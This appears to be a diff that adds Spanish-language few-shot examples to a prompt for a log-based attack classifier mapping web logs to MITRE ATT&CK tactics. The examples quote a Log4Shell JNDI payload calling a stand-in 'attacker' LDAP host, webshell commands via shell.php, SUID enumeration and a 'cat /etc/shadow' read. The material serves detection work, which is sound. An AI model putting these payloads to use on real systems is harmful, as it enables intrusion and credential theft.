@@ -220,6 +220,51 @@ EVENTOS CRITICOS: (ninguno).
 Senales: ninguna T1-T10 disparada.
 Clasificacion: none, confianza 1.0.
 
+EJEMPLO 5 — CVE-2021-44228 LOG4SHELL via User-Agent (Initial Access):
+Logs: GET /api/version HTTP/1.1, status 200, User-Agent="${jndi:ldap://attacker/x}".
+      Tambien aparece variante encoded URL: GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Fevil%2Fy%7D
+EVENTOS CRITICOS: log4shell_attempts=2 desde 10.10.0.5.
+Senales pre-calculadas: log4shell_attempts > 0 marca CVE-2021-44228.
+Clasificacion: Initial Access (TA0001), confianza 0.85, evidence
+              ["User-Agent contiene ${{jndi:ldap://attacker/x}} = exploit Log4Shell",
+               "URL encoded variant %24%7Bjndi tras unquote() = mismo payload"].
+Razonamiento: el payload JNDI es un intento de RCE via Log4j; aunque la
+              respuesta del servidor sea 200, el exploit fue enviado y procesado
+              por el log framework — esto cuenta como Initial Access (intento
+              de acceso inicial via vulnerabilidad). Si en ventanas posteriores
+              aparece webshell_execution o callback exitoso, escalar a Execution.
+
+EJEMPLO 6 — POST-INITIAL ACCESS DISCOVERY via webshell cmd=id:
+Logs: GET /vulnerabilities/exec/?cmd=id HTTP/1.1, status 200.
+      GET /shell.php?cmd=whoami status 200.
+      GET /shell.php?cmd=uname%20-a status 200.
+EVENTOS CRITICOS: WEBSHELL EXECUTION 3 eventos, sub_tactic=Discovery (id, whoami, uname).
+PHASE LOCK: hay history previa de Initial Access (login_success en t-2).
+Clasificacion: Discovery (TA0007), confianza 0.92, evidence
+              ["3 cmd= via webshell: id, whoami, uname -a — todos enumeracion del host"].
+Razonamiento: la sub_tactic de los cmd= mapea a Discovery por classify_webshell_cmd.
+              Phase lock: la ventana previa fue Initial Access; Discovery es la
+              fase siguiente esperable y la evidencia concreta confirma. NO
+              degradar a Execution generica — la sub_tactic es informacion mas
+              especifica que la fase generica.
+
+EJEMPLO 7 — PRIVILEGE ESCALATION via cmd= con uid=0(root):
+Logs: GET /shell.php?cmd=find%20%2F%20-perm%20-u%3Ds%20-type%20f status 200.
+      GET /shell.php?cmd=cat%20%2Fetc%2Fshadow status 200 (response contiene
+      "root:$6$..." — hash sombreado de root).
+      Subsiguiente GET /shell.php?cmd=cat%20%2Froot%2Fkey-3.txt status 200.
+EVENTOS CRITICOS: WEBSHELL EXECUTION sub_tactic=Privilege Escalation (find SUID).
+                  Subsiguiente sub_tactic=Credential Access (cat /etc/shadow).
+                  Final: lectura /root/* solo posible con uid=0.
+Clasificacion: Privilege Escalation (TA0004), confianza 0.95, evidence
+              ["find -perm -u=s -type f = enumeracion SUID = Privilege Escalation",
+               "cat /etc/shadow leido con respuesta 200 = root ya obtenido",
+               "lectura /root/key-3.txt confirma uid=0"].
+Razonamiento: tres senales coherentes de uid=0 obtenido. La fase Privilege
+              Escalation captura tanto la enumeracion como el resultado final.
+              Aunque cat /etc/shadow es Credential Access en otro contexto, aqui
+              es evidencia derivativa de que ya se escalo a root.
+
 FORMATO DE RESPUESTA:
 Responde UNICAMENTE con JSON valido en este formato. Puedes reportar MULTIPLES
 tacticas si la ventana contiene evidencia de varias fases del ataque:
